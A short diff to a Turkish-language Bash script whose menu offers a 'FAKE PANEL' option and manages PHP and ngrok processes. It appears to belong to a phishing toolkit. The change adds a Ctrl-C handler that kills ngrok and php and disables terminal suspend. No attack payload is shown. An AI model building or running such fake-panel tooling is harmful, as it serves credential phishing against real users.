@@ -66,8 +66,6 @@ $color
 
 \e[31m[\e[97m3\e[31m]\e[97m ────────── \e[32mFAKE PANEL\e[97m
 
-\e[31m[\e[97mK\e[31m]\e[97m ────────── \e[33mPHP & NGROK BAĞLANTIYI KES\e[97m
-
 \e[31m[\e[97mG\e[31m]\e[97m ────────── \e[33mGERİ\e[97m
 
 \e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
@@ -75,6 +73,17 @@ $color
 echo
 echo
 echo
+function finish() {
+	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
+	if [[ $kontrol == ngrok ]];then
+		killall ngrok
+		killall php
+	fi
+	exit
+}
+stty susp ""
+stty eof ""
+trap finish SIGINT
 dongu() {
 while :
 do
